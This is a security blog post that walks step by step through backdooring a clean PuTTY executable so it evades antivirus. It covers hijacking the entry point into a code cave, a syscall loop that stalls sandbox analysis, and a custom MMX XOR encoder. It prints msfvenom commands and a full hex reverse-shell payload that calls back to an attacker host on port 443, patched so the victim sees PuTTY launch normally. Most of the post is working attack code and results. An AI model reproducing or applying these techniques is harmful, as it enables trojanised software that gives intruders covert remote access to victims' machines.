---
layout: article
title: Killing Time with Antivirus - Modern AV Bypass
permalink: /page/killing-time-with-antivirus
key: page-article-header-overlay-background-image-HB
cover: /assets/images/thumbs/killing-time-with-antivirus.png
header:
  theme: dark
  background: 'linear-gradient(135deg, rgb(15, 32, 39), rgb(44, 83, 100))'
article_header:
  type: overlay
  theme: dark
  background_color: '#0F2027'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(15, 32, 39, .6), rgba(44, 83, 100, .6))'
    src: /assets/images/posts/killing-time-with-antivirus/cover.png
---

Experiment to bypass modern antivirus software employing signature-based detection and sandbox detection techniques.

<!--more-->

<style>
  .page__header .header__brand path {
    fill: rgba(255, 255, 255, .95);
  }
</style>

## Objective
Implement a Metasploit reverse shell payload in a clean PuTTY executable that will bypass AV signature and sandbox detection methods. Our baselines include a clean PuTTY portable executable and an out-of-the-box Metasploit reverse shell encoded with shikata_ga_nai.

<b>Clean PuTTY:</b><br>
<https://www.virustotal.com/#/file/81de431987304676134138705fc1c21188ad7f27edf6b77a6551aa693194485e/detection><br>
<img src="/assets/images/posts/killing-time-with-antivirus/34.png" alt="clean-scan" class="center">

<b>Metasploit encoded reverse shell:</b><br>
<https://www.virustotal.com/#/file/bba503e7033b03565ed619fa74869a6cf1cd6625f5c51fb4062304f6d0304b08/detection><br>
<code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.157.221 LPORT=443 EXITFUNC=none -f exe -e x86/shikata_ga_nai -o reverse-shell.exe</code>
<img src="/assets/images/posts/killing-time-with-antivirus/35.png" alt="msfvenom-shell-scan" class="center">



## Setup
We'll be debugging on an x86 Windows XP SP3 machine.


### Software
<a href="https://www.putty.org/" target="_blank">PuTTY</a> - An open source SSH and telnet client, developed originally by Simon Tatham for the Windows platform.
<a href="https://www.immunityinc.com/products/debugger/" target="_blank">Immunity Debugger</a> - A debugger used for analyzing malware, and reverse engineering binary files.


### Operating System
Windows XP SP3



## Overview
In many circumstances, AV will have limited time to scan and flag a file as malicious or safe. Within a short time frame, the program in question needs to be executed and analyzed within a tightly controlled environment. If no unsuspected or suspicious behavior is identified, we shouldn't get any red flags provided no bad signatures are detected within the binary.

What happens when an attacker forces malicious code within a program to stall its execution beyond the time allotted for the AV to make its call? Is this simple technique enough to bypass modern AV software?

We'll find out whether we can obtain access on a remote machine by sneaking an obfuscated reverse shell within a clean executable and running the backdoored file through modern AV scanners. The backdoored file will be tested on a Windows XP SP3 machine while we listen for a connection back on a Kali 2017.2 box. 



## Additional Background
Metasploit shellcode has been around for quite some time and is commonly used as a method of obtaining remote access to vulnerable machines. As a result, its signature and variants are readily identified in just about any modern AV worth its salt. An attacker might circumvent this by encoding the raw form of a Metasploit shell with one of the encoders that ships with the framework. However, having the ability to encode shellcode with a simple command-line flag has made even encoded versions of Metasploit's shellcode pervasive in cyber attacks and quickly recognized by most AV's. As shown above, encoding a reverse shell with Metasploit's shikata_ga_nai encoder still results in a 68.12% (47/69) detection rate on VirusTotal.

For that matter, it will be necessary to not only delay execution of our shellcode so AV sandboxing methods won't have ample time to observe its behaviour, but also write a custom shellcode encoder with a signature that cannot be so trivially identified.

Simple enough. Let's get to poppin' shells. 


## The Process

### Finding a Code Cave
If we open up PuTTY in Immunity, we'll be paused at the program entry point within the <b>.text</b> section.

<img src="/assets/images/posts/killing-time-with-antivirus/01.png" alt="program-entry" class="center">

We can check the Memory Map for a listing of the image's reserved sections and find that the <b>.text</b> section, containing the program's executable code, begins at base address <b>00430000</b> and has a size of 88000h bytes.

<img src="/assets/images/posts/killing-time-with-antivirus/02.png" alt="code-cave" class="center">

If we scan this section for its contents, we'll find that there just so happens to be a naturally occurring <b>code cave</b> of null bytes at address <b>004b7c00</b>.

<img src="/assets/images/posts/killing-time-with-antivirus/03.png" alt="null-bytes" class="center">

If we're going to be injecting our own code into the image, we wouldn't want to overwrite anything that would inhibit execution of the main program. Rather than reverse engineer the entire file and figure out what content would be safe to overwrite, it would probably be safer and faster to just write over these null bytes. If you refer back to the screenshot earlier, you might notice that the access rights to <b>.text</b> is set to Read and Executable (R E). That's not good. We're going to have to modify the access rights to allow the section to be written to.

Refer to <i>IMAGE_SCN_MEM_WRITE</i> in the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winnt/ns-winnt-_image_section_header" target="_blank"><i>_IMAGE_SECTION_HEADER</i></a> structure.


### Modifying Access Rights
Modifying access rights to our code cave can be done using a PE editor like CFF Explorer. In our situation, edits will be pretty straightforward, so we can use Immunity for our needs.

Checking the Memory Map once again, we can find the section containing all the Section Headers describing PuTTY.  

<img src="/assets/images/posts/killing-time-with-antivirus/04.png" alt="pe-headers" class="center">

Immunity has the ability to interpret the PE Header section in Dump.

<img src="/assets/images/posts/killing-time-with-antivirus/05.png" alt="pe-header-format" class="center">

Under the <b>.text</b> section, we'll see Section Flags loaded with the value <b>60000020</b>, indicating:

| Flag | Value | Description |
|:-----------:|:-----------:|:-----------:|
|IMAGE_SCN_CNT_CODE|0x00000020|The section contains executable code.|
|IMAGE_SCN_MEM_EXECUTE|0x20000000|The section can be executed as code.|
|IMAGE_SCN_MEM_READ|0x40000000|The section can be read.|

<img src="/assets/images/posts/killing-time-with-antivirus/06.png" alt=".text-characteristics" class="center">

Refer to <a href="https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format#section-table-section-headers" target="_blank"><i>Section Flags</i></a> in the Microsoft PE Format Spec.

We want to add the following to the current value of <b>60000020</b>:

| Flag | Value | Description |
|:-----------:|:-----------:|:-----------:|
|IMAGE_SCN_MEM_WRITE|0x80000000|The section can be written to.|

This will make the Characteristics field read <b>E0000020</b>. Sounds simple, and it really is. If we change the most significant byte from <b>60</b> to <b>E0</b> (60h + 80h), we're set. We'll also expand the VirtualSize and RawSize of the section to <b>88000h</b> bytes.

<img src="/assets/images/posts/killing-time-with-antivirus/07.png" alt="edited-characteristics" class="center">

Let's save these edits in a new file, so we have an untampered version of PuTTY as a backup. I went ahead and saved my file as putty-01.exe. If we re-open putty-01.exe, we'll be taken back to our program entry point. Remember how our code cave (now writable) starts at base address <b>00430000</b>? Well, now we can hijack or redirect PuTTY's execution flow to our code cave. 

A simple <code>call</code> overwrite from <code>call 00498265</code> --> <code>call 004b7c00</code> will do. We'll save our change as putty-01.exe once again before we add the first instructions of our AV bypasser.


### Killing Time

In Immunity, as with any debugger, we have the ability to Step Into instructions one by one. We just hijacked the initial <code>call</code> from  00498265 to 004b7c00. Since this was the program entry point, <code>call 004b7c00</code> should be the first instruction that's executed when the PE is opened. Let's Step Into our new instruction and see what happens.

<img src="/assets/images/posts/killing-time-with-antivirus/08.png" alt="random-bytes" class="center">

Okay, so our null bytes are gone, but the bytes in their place won't be crucial to the application. We can overwrite them without worrying about affecting PuTTY's execution.

The first two instructions we'll introduce to PuTTY are our traditional register and flag-saving commands <code>pushad</code> and <code>popad</code>. Following this, we'll want to write the code for our time-killing loop. The loop will be based on the NtAccessCheckAndAuditAlarm variant of Matt Miller's widely-referenced NtDisplayString egghunter. See the paper <a href="http://hick.org/code/skape/papers/egghunt-shellcode.pdf" target="_blank">here</a>.

```
    60             PUSHAD               ; save registers
    9C             PUSHFD               ; save flags
    BF 00000002    MOV EDI,A000000      ; load edi with counter 0x0a000000
    BA FFFFFF7F    MOV EDX,7FFFFFFF     ; last user space address in edx
    42             INC EDX              ; increment address
    52             PUSH EDX             ; push address onto stack
    6A 02          PUSH 2               ; NtAccessCheckAndAuditAlarm syscall
    58             POP EAX              ; pop 0x2 in eax
    CD 2E          INT 2E               ; syscall using previous register
    3C 05          CMP AL,5             ; 0xc0000005 == access violation
    5A             POP EDX              ; pop address back into edx
    4F             DEC EDI              ; decrement counter
    85FF           TEST EDI,EDI         ; is counter 0?
    75 F1          JNZ SHORT XXXXXXXXX  ; if counter != 0, loop back to INC EDX
    90             NOP
```

As you can see, there's nothing too special going on here. The code isn't supposed to accomplish anything for us rather than kill some time, so it makes sense to add an operation that will cost the CPU time to perform. The loop uses an NtAccessCheckAndAuditAlarm syscall to run through system space memory and check for access violations. It will continue to run until our counter reaches 0. If we need to buy more time, we can simply increase the value loaded into edi. In my case, this loop takes about 15-20 seconds to run, so it should be more than enough to let most AV's run their course on VirusTotal. The Final NOP instruction serves as a visual delimiter that separates the time-killer from the rest of our instructions.

<img src="/assets/images/posts/killing-time-with-antivirus/09.png" alt="loop" class="center">

Let's go ahead and save our newly introduced instructions as putty-02.exe.

When we open putty-02.exe, we once again Step Into our call to the code cave. We can step through the <code>pushad</code> and <code>pushfd</code> instructions to take note of where ESP is aligned to. In my case, it's <b>012ff9c</b>. We'll need to return ESP back to this address when we're ready to return execution back to the program entry point.

<img src="/assets/images/posts/killing-time-with-antivirus/10.png" alt="loop" class="center">


### Encoding with MMX

Most of you are probably already familiar with the concept of your basic XOR encoder. In essence, we are taking chunks of instructions in memory and performing a logical XOR operation on that value with a pre-defined key (e.g. <b>0xdddddddd</b>). We then store the XOR'ed value in memory where the original 4-byte chunk resided. This acts as a form of obfuscation resulting in code that cannot be deciphered without knowledge of the key and encoding operation. Prior to execution, a decoder will perform the same XOR operation with the same pre-defined key (<b>0xdddddddd</b>) on the same instructions. This will result in the original instructions as they were before encoding. They will then be placed back into memory to be read and executed by the CPU.

In the code segment below, <b>AAAAAAAA</b> and <b>99999999</b> serve as placeholders for the address we want to start encoding at and the last address we want to encode, respectively.

```
MOV EAX,AAAAAAAA                    ; move starting address into eax
XOR DWORD PTR DS:[EAX],DDDDDDDD     ; XOR contents of EAX with XOR key
ADD EAX,4                           ; move onto next 4-byte address
CMP EAX,99999999                    ; compare current address with end address
JLE SHORT XXXXXXXX                  ; if end not reached, loop back to INC EAX
```

Most AV scanners will quickly recognize a traditional XOR encoder like the one above and immediately flag the file as malicious. If we make an attempt to implement the XOR encoder in a way that the scanners are not familiar with, there is a chance that the AV won't be able to recognize its fingerprint. Below is our attempt to implement the XOR encoder using 64-bit <a href="https://en.wikipedia.org/wiki/MMX_(instruction_set)" target="_blank"><i>MMX</i></a> registers.  

```
B8 AAAAAAAA      MOV EAX,AAAAAAAA               ; move starting address of msfvenom shellcode into eax  
BF 77777777      MOV EDI,77777777               ; lower 4 bytes of our xor qword in edi
0F6EC7           MOVD MM0,EDI                   ; load lower 4 bytes into mm0
0F62C0           PUNPCKLDQ MM0,MM0              ; a hack to copy lower 4 bytes of mm0 into upper 4 bytes 
0FEF00           PXOR MM0,QWORD PTR DS:[EAX]    ; encoding operation
0F7F00           MOVQ QWORD PTR DS:[EAX],mm0    ; replace raw instructions with encoded instructions
83C0 08          ADD EAX,8                      ; increment address counter
3D 99999999      CMP EAX,99999999               ; compare address with end of shellcode
7E EA            JLE SHORT XXXXXXXXX            ; if end not reached, loop back to MOVD MM0,EDI
90               NOP
90               NOP
```

Instead of encoding instructions 4 bytes at a time, we'll be encoding them 8 bytes at a time using the 64-bit key, <b>0x7777777777777777</b>.

<img src="/assets/images/posts/killing-time-with-antivirus/11.png" alt="xor-encoder" class="center">

We'll leave our placeholder addresses for now as we have not yet introduced our shellcode. Once our shellcode is assembled, we can swap the placeholder values with our desired addresses.

Let's save our new modifications to putty-03.exe.


### Introducing Shellcode

Using Metasploit, we can generate a Windows reverse shell to connect back to us on port 443. I have <b>metasploit v4.17.3-dev</b> installed on my machine, so I'll be using <b>msfvenom</b> from this version of Metasploit.

```
Command:
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.157.221 LPORT=443 EXITFUNC=none -f hex

Output:
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a0568c0a89ddd68020001bb89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbaac5e25d68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
```

On a Kali 2017.2 box, the command above generates a payload that we can Binary Copy right into the debugger. We'll place the shellcode in memory directly after our encoder stub.

<img src="/assets/images/posts/killing-time-with-antivirus/12.png" alt="shellcode-1" class="center"><br>
...<br>
...<br>
...<br>
<img src="/assets/images/posts/killing-time-with-antivirus/13.png" alt="shellcode-2" class="center">

We now need to modify a few features of the shellcode that may keep PuTTY from launching properly if left unaddressed. Our first task at hand is to enable simultaneous execution of PuTTY and the reverse shell that will be coming back to the attacking machine. Without this modification, PuTTY would not launch until after our we exit our shell, which is not acceptable behavior as the victim who unsuspectingly launches the program would immediately assume something is wrong with the executable.

Metasploit <a href="https://en.wikipedia.org/wiki/Dynamic-link_library#Symbol_resolution_and_binding" target="_blank">calls Windows API functions</a> using custom generated hashes rather than by name. The hashing function can be found <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/hash.py" target="_blank">here</a>. 

The first function call we will concern ourselves with is <code>WaitForSingleObject</code> in kernel32.dll with hash <b>0x601D8708</b>. From Metasploit's public repo, I've extracted a snippet of <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_shell.asm" target="_blank">block_shell.asm</a> which we will find in our reverse shell payload.

```
; perform the call to WaitForSingleObject
mov eax, esp           ; save pointer to the PROCESS_INFORMATION Structure 
dec esi                ; Decrement ESI down to -1 (INFINITE)
push esi               ; push INFINITE inorder to wait forever
inc esi                ; Increment ESI back to zero
push dword [eax]       ; push the handle from our PROCESS_INFORMATION.hProcess
push 0x601D8708        ; hash( "kernel32.dll", "WaitForSingleObject" )
call ebp               ; WaitForSingleObject( pi.hProcess, INFINITE );
```

According to Microsoft's <a href="https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject" target="_blank">documentation</a> for <code>WaitForSingleObject</code>, if the function (command shell in this case) is passed a time-out interval of <b>-1</b>, "the function will return only when the object is signaled." That's no good. We called <code>WaitForSingleObject</code> with a process handle for a command shell and a time-out interval of <b>-1</b> (== infinity). We want to set <i>dwMilliseconds</i> to <b>0</b> instead so the function can return immediately. This can be done by simply changing the <code>dec esi</code> to a <code>NOP</code> as shown in the screenshots below:

Before:<br>
<img src="/assets/images/posts/killing-time-with-antivirus/14.png" alt="dec-esi-before" class="center">

After:<br>
<img src="/assets/images/posts/killing-time-with-antivirus/15.png" alt="dec-esi-after" class="center">

The second function call we will concern ourselves with is <code>ExitProcess</code> in kernel32.dll with hash <b>0x56A2B5F0</b>. Below is a snippet of <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm" target="_blank">block_reverse_tcp.asm</a> which (surprise!) also belongs to our reverse shell payload.

```
set_address:
  push byte 0x05         ; retry counter
  push 0x0100007F        ; host 127.0.0.1
  push 0x5C110002        ; family AF_INET and port 4444
  mov esi, esp           ; save pointer to sockaddr struct
  
try_connect:
  push byte 16           ; length of the sockaddr struct
  push esi               ; pointer to the sockaddr struct
  push edi               ; the socket
  push 0x6174A599        ; hash( "ws2_32.dll", "connect" )
  call ebp               ; connect( s, &sockaddr, 16 );

  test eax,eax           ; non-zero means a failure
  jz short connected

handle_failure:
  dec dword [esi+8]
  jnz short try_connect

failure:
  push 0x56A2B5F0        ; hardcoded to exitprocess for size
  call ebp
```

Just above the <code>try_connect</code> function, we can see that a retry counter is pushed onto the stack just before the <b>sockaddr struct</b> is pushed. Under <code>handle_failure</code> we decrement this counter if the connection is not established. Once the counter hits 0, we fall through to <code>failure</code> where we call <code>ExitProcess</code>. Our fix for this is not unlike our fix for the problematic <code>WaitForSingleObject</code> parameter. Let's overwrite the seven bytes that make up the instructions <code>push 0x56A2B5F0</code> and <code>call ebp</code> with seven <code>NOP</code>s.

Before:<br>
<img src="/assets/images/posts/killing-time-with-antivirus/16.png" alt="exit-process-before" class="center">

After:<br>
<img src="/assets/images/posts/killing-time-with-antivirus/17.png" alt="exit-process-after" class="center">

Finally, we skip over the <b>call EXITFUNK( 0 )</b> in <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_exitfunk.asm" target="_blank">block_exitfunk.asm</a> by substituting the final <code>call ebp</code> in our shellcode with <code>NOP</code>s.

Before:<br>
<img src="/assets/images/posts/killing-time-with-antivirus/18.png" alt="exitfunk-before" class="center">

After:<br>
<img src="/assets/images/posts/killing-time-with-antivirus/19.png" alt="exitfunk-after" class="center">

With that, PuTTY should launch as expected when its time to run the program. At last, we can save our new instructions to putty-04.exe.

<img src="/assets/images/posts/killing-time-with-antivirus/20.png" alt="shell-after" class="center">


### Finalizing our Shellcode

Now, we can open up putty-04.exe and adjust our encoding addresses according to the placement of our shellcode in memory.

The <code>cld</code> command marks the beginning of our shellcode in memory. As you can see, the start address is <b>004b7c1c</b>. We'll go ahead and substitute our previous placeholder, <b>aaaaaaaa</b>, with <b>004b7c1c</b>.

Shell start:<br>
<img src="/assets/images/posts/killing-time-with-antivirus/21.png" alt="shell-start" class="center">

Encoder edit:<br>
<img src="/assets/images/posts/killing-time-with-antivirus/22.png" alt="encoder-start-address" class="center">

After our shellcode runs its course, we'll want to return execution back to PuTTY. Here is a reminder of what the program entry point looked like:<br>
<img src="/assets/images/posts/killing-time-with-antivirus/01.png" alt="program-entry" class="center">

To return execution back to the entry point, we'll have to realign the stack pointer to its original location (<b>0012ff9c</b>) after <code>pushad</code> and <code>pushfd</code> were executed. Let's go ahead and assemble a <code>mov esp, 12ff9c</code> to return esp back to its original location. We'll then want to pop the registers and flags back to their original states with <code>popfd</code> and <code>popad</code>. Finally, we're ready to return execution back to the program entry point. Execution will return to the instruction right after the call to our code cave. Thus, our desired return destination is <code>jmp 00497e6e</code> at address <b>00497fdb</b>. Inserting a simple <code>retn</code> will do the trick. Immunity took the liberty in adding a couple of <code>NOP</code>s to fill out the rest of the bytes for the instruction I overwrote. Results may differ in your situation.

<img src="/assets/images/posts/killing-time-with-antivirus/23.png" alt="return" class="center">

The address of the final <code>NOP</code> happens to be <b>004b7d8b</b>. We can use this as our end address for our encoder stub. Let's go back to our encoder stub and replace the <b>99999999</b> placeholder with <b>004b7d8b</b>.

<img src="/assets/images/posts/killing-time-with-antivirus/24.png" alt="encoder-end-address" class="center">

We're now ready to encode our shellcode. Let's place a breakpoint at the <code>NOP</code> that follows our <code>jle short xxxxxxxx</code>. When we hit resume execution, we should hit the breakpoint and find that all of our shellcode has been encoded.

Before encoding:<br>
<img src="/assets/images/posts/killing-time-with-antivirus/25.png" alt="encoder-breakpoint" class="center">

After encoding:<br>
<img src="/assets/images/posts/killing-time-with-antivirus/26.png" alt="encoded-shell-1" class="center"><br>
...<br>
...<br>
...<br>
<img src="/assets/images/posts/killing-time-with-antivirus/27.png" alt="encoded-shell-2" class="center">

As you can see, all the modified instructions are highlighted in teal. This is the encoded version of our reverse shell. We can highlight all of the instructions that have been added and modified so far, including the encoder stub, and save our changes as putty-05.exe.

<img src="/assets/images/posts/killing-time-with-antivirus/28.png" alt="encoded-shell-3" class="center">


### Testing the Exploit

If we open up putty-05.exe, our program entry point should have a call to our code cave which contains instructions that, upon execution, will perform a 15-20 second time-killing loop, decode an encoded reverse shell, send us a reverse shell on port 443, and finally, launch PuTTY as if the program had not been modified. Let's try this out. 

Here, we have a breakpoint set at the first <code>NOP</code> separating our encoder/decoder stub and the shellcode.

<img src="/assets/images/posts/killing-time-with-antivirus/29.png" alt="decoder-1" class="center">

When we resume execution, we'll hit this breakpoint and the program will pause its state. Immunity can re-analyze the decoded instructions with <b>Ctrl + A</b>. Once decoded, we'll see that our instructions appear in memory as we had entered them prior to encoding.

<img src="/assets/images/posts/killing-time-with-antivirus/30.png" alt="decoded-shell-1" class="center"><br>
...<br>
...<br>
...<br>
<img src="/assets/images/posts/killing-time-with-antivirus/31.png" alt="decoded-shell-2" class="center">

Now, we can set up a netcat listener on port 443 which should receive a connection once execution resumes. We press <b>Play</b> and successfully establish the connection. PuTTY launches as if nothing were different about its code base.

<img src="/assets/images/posts/killing-time-with-antivirus/32.png" alt="nc" class="center">

<img src="/assets/images/posts/killing-time-with-antivirus/33.png" alt="putty-launch" class="center">


## Evaluation

Now, it's time to run our resulting PE through VirusTotal to see how it fares against modern AV systems. For comparison, we have the clean version of PuTTY, a Metasploit reverse shell executable encoded with shikata_ga_nai, and our custom PuTTY PE backdoor.

<b>Clean PuTTY:</b><br>
<img src="/assets/images/posts/killing-time-with-antivirus/34.png" alt="clean-scan" class="center">

<b>Metasploit encoded reverse shell:</b><br>
<code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.157.221 LPORT=443 EXITFUNC=none -f exe -e x86/shikata_ga_nai -o reverse-shell.exe</code>
<img src="/assets/images/posts/killing-time-with-antivirus/35.png" alt="msfvenom-shell-scan" class="center">

<b>Custom PuTTY Backdoor:</b><br>
<https://www.virustotal.com/#/file/0b7117842f09512f1bbc64d07dd90451d0706f4e43a9951002b5099620da5e62/detection>
<img src="/assets/images/posts/killing-time-with-antivirus/36.png" alt="backdoor-scan" class="center">

While our backdoor didn't go completely undetected against modern AV software, we made quite a significant improvement from the out-of-the-box Metasploit shikata_ga_nai encoder. At the end of the day, we can do much more to improve our custom backdoor. For starters, we may want to make our time-killing loop less blatant. There was no attempt to obfuscate the parts that could be attributed to Matt Miller's infamous egghunter. Secondly, we performed only one pass of XOR encoding on our shellcode with a very basic key. Perhaps adding several layers of different or less common encoding techniques would provide better results. We could even go so far as to write our own reverse shellcode rather than use one generated by Metasploit. The possibilities are endless.

All in all, this was a rudimentary experiment to see if the combination of a custom encoder and delayed shell execution could suppress the number of AV software that flagged our backdoor as malicious. Though the results weren't perfect, we were able to lower our shell's detection rate by 54.5% on modern AV software with relatively low effort. With some minor tweaks and some more creativity, it's likely we can achieve even better results.







